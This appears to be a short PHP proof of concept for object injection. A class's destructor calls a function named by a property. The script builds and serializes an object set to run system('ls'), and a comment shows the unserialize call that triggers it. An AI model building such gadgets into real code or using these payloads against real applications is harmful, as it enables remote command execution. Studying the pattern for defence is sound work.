<?php

class TestClass
{

    public $variable = 'hackme';
    public $my_function = 'var_dump';

    public function my_echo()
    {	
	$my_function = $this -> my_function;
        $my_function($this -> variable) ;
    }

    public function __wakeup()
    {
        echo '__wakeup <br />';
    }


    public function __construct()
    {
        echo '__construct <br />';
    }


    public function __destruct()
    {
        $this -> my_echo();
    }

}


$a = new TestClass();
$a -> variable = "ls";
$a -> my_function = "system";
echo serialize($a);

//unserialize('O:9:"TestClass":2:{s:8:"variable";s:2:"ls";s:11:"my_function";s:6:"system";}');


